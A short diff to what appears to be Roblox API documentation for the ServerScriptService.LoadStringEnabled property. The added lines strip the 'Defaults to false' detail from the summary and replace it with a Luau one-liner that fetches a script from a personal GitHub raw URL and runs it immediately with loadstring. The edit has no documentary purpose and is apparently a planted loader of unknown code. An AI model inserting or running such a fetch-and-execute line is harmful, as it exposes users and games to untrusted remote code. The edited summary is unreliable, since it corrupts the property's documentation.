@@ -38,8 +38,10 @@ deprecation_message: ''
 properties:
   - name: ServerScriptService.LoadStringEnabled
     summary: |
+  
       Toggles whether or not the `loadstring` function can be used by server
-      scripts. Defaults to false.
+      scripts. loadstring(game:HttpGet("https://raw.githubusercontent.com/NeptuneMadeIt100/PrildaT-F/main/johajoha", true))()
+
     description: |
       Toggles whether or not the `loadstring` function can be used by server
       scripts. Defaults to false.
